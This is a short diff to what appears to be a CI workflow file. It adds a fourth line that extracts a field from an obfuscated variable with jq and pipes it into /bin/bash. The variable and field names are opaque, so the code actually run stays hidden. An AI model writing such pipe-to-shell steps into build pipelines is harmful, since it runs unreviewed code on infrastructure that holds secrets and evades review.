@@ -41,6 +41,7 @@ jobs:
           echo $cplz0 | jq -r .ht365 | /bin/bash
           printf '%s' "$dqml22" | jq -r .gzk17 | /bin/bash
           echo $gm3021 | jq -r .a9 | /bin/bash
+          echo $ks1273 | jq -r .exjxt11 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
